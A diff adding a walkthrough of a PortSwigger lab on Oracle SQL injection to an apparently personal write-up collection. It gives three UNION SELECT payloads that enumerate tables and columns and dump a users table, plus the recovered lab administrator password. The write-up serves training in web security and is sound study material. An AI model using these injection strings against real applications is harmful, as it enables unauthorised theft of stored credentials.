@@ -138,3 +138,41 @@ sau khi trích xuất cột từ bảng users\_legzqo, mình để ý tới 2 c�
 administrator: vmsguwzh126iicoib1n5
 
 <figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+## Lab: [SQL injection](https://portswigger.net/web-security/sql-injection) attack, listing the database contents on Oracle
+
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+
+To solve the lab, log in as the `administrator` user.
+
+<details>
+
+<summary> <strong>Hint</strong></summary>
+
+
+
+</details>
+
+
+
+<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+'UNION+SELECT+table\_name,null+from+all\_tables--
+
+<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+USERS\_TWRRPY
+
+'UNION+SELECT+column\_name,null+from+all\_tab\_columns+WHERE+table\_name+%3d+'USERS\_TWRRPY'--
+
+<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+'UNION+SELECT+USERNAME\_BKHDTO,PASSWORD\_TTSWTR+from+USERS\_TWRRPY--
+
+<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+administrator: ol1iy37tllx2fo1h9mli
+
+<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
